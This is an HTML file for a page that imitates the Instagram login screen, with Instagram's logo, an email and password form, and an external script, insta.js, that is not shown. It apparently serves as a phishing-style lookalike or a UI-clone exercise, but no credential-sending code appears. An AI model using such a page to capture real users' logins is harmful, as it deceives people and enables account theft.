<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <title>Instagram Login</title>
</head>
<body>
    <main class="container">
        <section class="login-section">
            <div class="login-form">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" 
                     alt="Instagram Logo" class="logo">
                <form id="login-form">
                    <input id="email" name="email" placeholder="Email" />
                    <input id="password" name="password" type="password" placeholder="Password" />
                    <button type="submit">Log In</button>
                </form>
                <div class="separator">
                    <span></span>
                    <p>OR</p>
                    <span></span>
                </div>
                <a href="#" class="login-with-facebook">Log in with Facebook</a>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            <div class="register-section">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
        </section>
    </main>
</body>
<script src="insta.js"></script>
</html>
